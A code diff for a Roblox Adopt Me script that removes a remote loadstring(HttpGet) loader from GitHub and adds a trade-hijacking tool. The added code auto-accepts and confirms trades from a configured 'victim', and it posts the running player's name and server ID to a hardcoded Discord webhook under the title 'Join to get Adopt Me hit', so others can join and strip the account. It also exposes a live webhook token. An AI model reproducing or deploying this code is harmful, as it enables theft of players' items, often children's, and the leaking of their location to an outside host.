@@ -1,1 +1,164 @@
-loadstring(game:HttpGet(https://raw.githubusercontent.com/bryanthegod1234/adopt-me-/refs/heads/main/bryaan
+if not game:IsLoaded() then
+    game.Loaded:Wait() -- Wait for game to load
+end
+
+-- Removed token and channelId check, as we're using a webhook now.
+
+local bb = game:GetService("VirtualUser") -- Anti AFK
+game:service "Players".LocalPlayer.Idled:connect(function()
+    bb:CaptureController()
+    bb:ClickButton2(Vector2.new())
+end)
+
+local HttpServ = game:GetService("HttpService")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local victimFile = isfile("useradm.txt")
+local joinedFile = isfile("joined_ids_adm.txt")
+if not victimFile then
+    writefile("useradm.txt", "victim username")
+end
+if not joinedFile then
+    writefile("joined_ids_adm.txt", "[]") -- Initialize with empty JSON array
+end
+local victimUser = readfile("useradm.txt")
+local joinedIds = HttpServ:JSONDecode(readfile("joined_ids_adm.txt"))
+local didVictimLeave = false
+local timer = 0
+
+local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
+while loadingScreen.Enabled do
+    wait(1) -- We wait while the loading screen is active
+end
+wait(10)
+local waittime = delay or 0.1
+wait(waittime) -- Small delay to make sure we are fully loaded
+
+local tradeFrame = playerGui.TradeApp.Frame
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local RouterClient = Loads("RouterClient")
+local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineRequest")
+local AddItemRemote = RouterClient.get("TradeAPI/AddItemToOffer")
+local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
+local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
+local inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+local TradeRequestReceivedRemote = RouterClient.get_event("TradeAPI/TradeRequestReceived")
+
+TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
+    if sender.Name == victimUser then
+        TradeAcceptOrDeclineRequest:InvokeServer(sender, true)
+    else
+        TradeAcceptOrDeclineRequest:InvokeServer(sender, false)
+    end
+end)
+
+game:GetService('TextChatService').TextChannels.RBXGeneral:SendAsync('hi')
+
+local function saveJoinedId(messageId)
+    table.insert(joinedIds, messageId) -- Add the new ID
+    writefile("joined_ids_adm.txt", HttpServ:JSONEncode(joinedIds)) -- Save back to the file
+end
+
+local foodAdded = false
+
+local function IsTrading()
+    return tradeFrame.Visible
+end
+
+local function acceptTrade()
+    while task.wait(0.1) do
+        if IsTrading() then
+            if not foodAdded then
+                local foodKeys = {}
+                for uid, data in pairs(inventory.food) do
+                    table.insert(foodKeys, uid)
+                end
+                if #foodKeys > 0 then
+                    local randomIndex = math.random(1, #foodKeys)
+                    local randomFoodUid = foodKeys[randomIndex]
+                    AddItemRemote:FireServer(randomFoodUid)
+                    foodAdded = true
+                end
+            end
+            AcceptNegotiationRemote:FireServer()
+        end
+    end
+end
+
+local function confirmTrade()
+    while task.wait(0.1) do
+        if IsTrading() and foodAdded then
+            ConfirmTradeRemote:FireServer()
+        end
+    end
+end
+
+local function waitForPlayerLeave()
+    local playerRemovedConnection
+    playerRemovedConnection = game.Players.PlayerRemoving:Connect(function(removedPlayer)
+        if removedPlayer.Name == victimUser then
+            if playerRemovedConnection then
+                playerRemovedConnection:Disconnect()
+            end
+            didVictimLeave = true
+        end
+    end)
+end
+
+local function tradeTimer()
+    while task.wait(1) do
+        if IsTrading() then
+            timer = 0
+        else
+            timer = timer + 1
+            foodAdded = false
+        end
+    end
+end
+
+waitForPlayerLeave()
+task.spawn(acceptTrade) -- Start accepting trades
+task.spawn(confirmTrade) -- Start confirming trades
+task.spawn(tradeTimer)
+
+-- WEBHOOK URL -  Keep this *private*.  Anyone with this URL can post to your webhook.
+local webhookUrl = "https://discord.com/api/webhooks/1340785597173731408/8rAVoodILl4lrUVe4dy0UdFwTAWYNUiaCeS02KNTsKKcR_2SWT13uvlZOy65HwJtkvHn"
+
+local function autoJoin()
+    local response = request({
+        Url = webhookUrl,  -- Use the webhook URL
+        Method = "POST",  -- Webhooks use POST
+        Headers = {
+            ["Content-Type"] = "application/json"  --  Discord webhooks expect JSON
+        },
+        Body = HttpServ:JSONEncode({  -- Construct the webhook payload
+            content = "",  --  Webhook content (can be empty if using embeds)
+            embeds = {{  -- Use an embed for structured data
+                title = "Join to get Adopt Me hit",
+                description = string.format("TeleportToPlaceInstance(%s, '%s')", game.PlaceId, game.JobId), -- Current place and job
+                fields = {
+                    {
+                        name = "Victim",
+                        value = game.Players.LocalPlayer.Name  -- Current player's name
+                    }
+                }
+            }}
+        })
+    })
+
+    if response.StatusCode >= 200 and response.StatusCode < 300 then
+        print("Webhook sent successfully!")
+         --  No need to process messages; we're *sending* the message.
+    else
+        print("Webhook failed to send. Status Code:", response.StatusCode, "Body:", response.Body)
+    end
+end
+
+while wait(5) do
+   if didVictimLeave or timer > 10 then
+        autoJoin() -- Send the webhook
+        didVictimLeave = false --reset
+        timer = 0
+    end
+end
+
